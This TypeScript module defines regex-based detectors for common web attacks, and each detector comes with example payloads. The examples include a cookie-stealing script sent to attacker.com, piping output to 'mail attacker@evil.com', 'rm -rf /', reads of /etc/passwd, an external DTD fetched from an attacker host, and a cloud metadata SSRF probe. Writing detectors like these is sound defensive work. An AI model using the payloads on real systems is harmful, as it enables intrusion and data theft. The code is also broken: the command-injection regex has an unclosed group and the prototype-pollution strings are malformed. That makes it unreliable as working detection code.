/**
 * Vulnerability Patterns
 * 
 * This module defines patterns for detecting potential security vulnerabilities.
 */

/**
 * Vulnerability pattern type
 */
export enum VulnerabilityType {
  SQL_INJECTION = 'sql_injection',
  XSS = 'xss',
  COMMAND_INJECTION = 'command_injection',
  PATH_TRAVERSAL = 'path_traversal',
  OPEN_REDIRECT = 'open_redirect',
  XXE = 'xxe',
  SSRF = 'ssrf',
  PROTOTYPE_POLLUTION = 'prototype_pollution'
}

/**
 * Vulnerability pattern
 */
export interface VulnerabilityPattern {
  type: VulnerabilityType;
  name: string;
  pattern: RegExp;
  description: string;
  severity: 'critical' | 'high' | 'medium' | 'low';
  contexts: string[];
  examples: string[];
  remediation: string;
}

/**
 * Vulnerability patterns for each vulnerability type
 */
export const VULNERABILITY_PATTERNS: VulnerabilityPattern[] = [
  // SQL Injection patterns
  {
    type: VulnerabilityType.SQL_INJECTION,
    name: 'Basic SQL Injection',
    pattern: /(\b(select|insert|update|delete|drop|alter|exec|union|create|where)\b.*\b(from|into|table|database|values)\b)|('(''|[^'])*')|(--)|(\/\*.*\*\/)/i,
    description: 'Detects basic SQL injection attempts including common SQL keywords and comment indicators',
    severity: 'high',
    contexts: ['query', 'body', 'params'],
    examples: [
      "' OR 1=1 --",
      "admin' --",
      "SELECT * FROM users",
      "1; DROP TABLE users"
    ],
    remediation: 'Use parameterized queries or an ORM to prevent SQL injection'
  },
  {
    type: VulnerabilityType.SQL_INJECTION,
    name: 'UNION SQL Injection',
    pattern: /(\bunion\b.*\bselect\b)/i,
    description: 'Detects UNION-based SQL injection attempts',
    severity: 'high',
    contexts: ['query', 'body', 'params'],
    examples: [
      "' UNION SELECT username, password FROM users --",
      "' UNION ALL SELECT NULL, NULL, NULL, table_name FROM information_schema.tables --"
    ],
    remediation: 'Use parameterized queries or an ORM to prevent SQL injection'
  },
  
  // XSS patterns
  {
    type: VulnerabilityType.XSS,
    name: 'Basic Script Injection',
    pattern: /<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/i,
    description: 'Detects attempts to inject script tags',
    severity: 'high',
    contexts: ['body', 'query', 'params'],
    examples: [
      "<script>alert(1)</script>",
      "<script>document.location='http://attacker.com/cookie?c='+document.cookie</script>"
    ],
    remediation: 'Use context-appropriate output encoding and Content-Security-Policy headers'
  },
  {
    type: VulnerabilityType.XSS,
    name: 'Event Handler Injection',
    pattern: /\b(on\w+)=["']?((?:.(?!["']?\s+(?:\S+)=|[>"']))+.)["']?/i,
    description: 'Detects attempts to inject JavaScript event handlers',
    severity: 'medium',
    contexts: ['body', 'query', 'params'],
    examples: [
      "<img src='x' onerror='alert(1)'>",
      "<body onload='alert(1)'>"
    ],
    remediation: 'Use context-appropriate output encoding and Content-Security-Policy headers'
  },
  {
    type: VulnerabilityType.XSS,
    name: 'JavaScript URI Injection',
    pattern: /\b(?:javascript|data|vbscript):/i,
    description: 'Detects attempts to inject JavaScript URI schemes',
    severity: 'medium',
    contexts: ['body', 'query', 'params'],
    examples: [
      "javascript:alert(1)",
      "<a href='javascript:alert(1)'>Click me</a>",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="
    ],
    remediation: 'Validate and sanitize all URL values, use CSP headers with strict-dynamic'
  },
  
  // Command Injection patterns
  {
    type: VulnerabilityType.COMMAND_INJECTION,
    name: 'Basic Command Injection',
    pattern: /[;&|`\s](\w+)(?:\s+[\w\-\/\\]+)+\s*($|\||\d+>&\d+|\d+>/i,
    description: 'Detects basic command injection attempts',
    severity: 'critical',
    contexts: ['body', 'query', 'params'],
    examples: [
      "file.txt; rm -rf /",
      "input.txt && cat /etc/passwd",
      "text | mail attacker@evil.com"
    ],
    remediation: 'Avoid using shell commands with user input, use allow lists for allowed values'
  },
  {
    type: VulnerabilityType.COMMAND_INJECTION,
    name: 'Command Substitution',
    pattern: /\$\(.*\)|\`.*\`/,
    description: 'Detects command substitution in shell commands',
    severity: 'critical',
    contexts: ['body', 'query', 'params'],
    examples: [
      "$(cat /etc/passwd)",
      "`cat /etc/passwd`"
    ],
    remediation: 'Avoid using shell commands with user input, use allow lists for allowed values'
  },
  
  // Path Traversal patterns
  {
    type: VulnerabilityType.PATH_TRAVERSAL,
    name: 'Directory Traversal',
    pattern: /(?:\.\.|%2e%2e|%252e%252e)[\/\\]/i,
    description: 'Detects directory traversal attempts',
    severity: 'high',
    contexts: ['query', 'params', 'path'],
    examples: [
      "../../../etc/passwd",
      "%2e%2e/%2e%2e/etc/passwd",
      "..\\..\\windows\\system32\\config"
    ],
    remediation: 'Use path normalization and validation, restrict access to the filesystem'
  },
  
  // Open Redirect patterns
  {
    type: VulnerabilityType.OPEN_REDIRECT,
    name: 'URL Redirection',
    pattern: /\b(?:url|redirect|return_to|next|returnUrl|return_url|redirect_to|next_url)\b=(?:https?:\/\/|\/\/|www\.)/i,
    description: 'Detects potential open redirect vulnerabilities',
    severity: 'medium',
    contexts: ['query', 'body'],
    examples: [
      "redirect=https://evil.com",
      "return_to=//attacker.com",
      "next=https://malicious-site.com/phishing"
    ],
    remediation: 'Validate redirect URLs against an allow list or use relative paths'
  },
  
  // XXE patterns
  {
    type: VulnerabilityType.XXE,
    name: 'XML External Entity',
    pattern: /<!(?:DOCTYPE|ENTITY)[\s\S]*?(?:SYSTEM|PUBLIC)[\s\S]*?["']/i,
    description: 'Detects XML External Entity injection attempts',
    severity: 'high',
    contexts: ['body'],
    examples: [
      "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>",
      "<!ENTITY % data SYSTEM \"http://attacker.com/evil.dtd\">"
    ],
    remediation: 'Disable external entities in XML parsers, use JSON where possible'
  },
  
  // SSRF patterns
  {
    type: VulnerabilityType.SSRF,
    name: 'Server-Side Request Forgery',
    pattern: /\b(?:url|uri|endpoint|callback|webhook|api_url|api_endpoint)\b=(?:https?:\/\/|\/\/|file:\/\/|gopher:\/\/|dict:\/\/|ldap:\/\/)/i,
    description: 'Detects potential Server-Side Request Forgery attempts',
    severity: 'high',
    contexts: ['query', 'body'],
    examples: [
      "url=http://internal-service.local/api",
      "webhook=http://169.254.169.254/latest/meta-data/",
      "endpoint=file:///etc/passwd"
    ],
    remediation: 'Validate URLs against an allow list, use URL parsing libraries'
  },
  
  // Prototype Pollution patterns
  {
    type: VulnerabilityType.PROTOTYPE_POLLUTION,
    name: 'Prototype Pollution',
    pattern: /["\[](__proto__|constructor|prototype)["\]]/i,
    description: 'Detects potential prototype pollution attempts',
    severity: 'medium',
    contexts: ['body', 'query'],
    examples: [
      "{\\"__proto__\\":{}}",
      "{\\"constructor\\":{\\"prototype\\":{}}}",
      "foo[__proto__][bar]=baz"
    ],
    remediation: 'Use Object.create(null) for empty objects, validate and sanitize user input'
  }
];

/**
 * Get vulnerability patterns by type
 */
export function getPatternsByType(type: VulnerabilityType): VulnerabilityPattern[] {
  return VULNERABILITY_PATTERNS.filter(pattern => pattern.type === type);
}

/**
 * Get vulnerability patterns by context
 */
export function getPatternsByContext(context: string): VulnerabilityPattern[] {
  return VULNERABILITY_PATTERNS.filter(pattern => pattern.contexts.includes(context));
}

/**
 * Get vulnerability pattern by name
 */
export function getPatternByName(name: string): VulnerabilityPattern | undefined {
  return VULNERABILITY_PATTERNS.find(pattern => pattern.name === name);
}
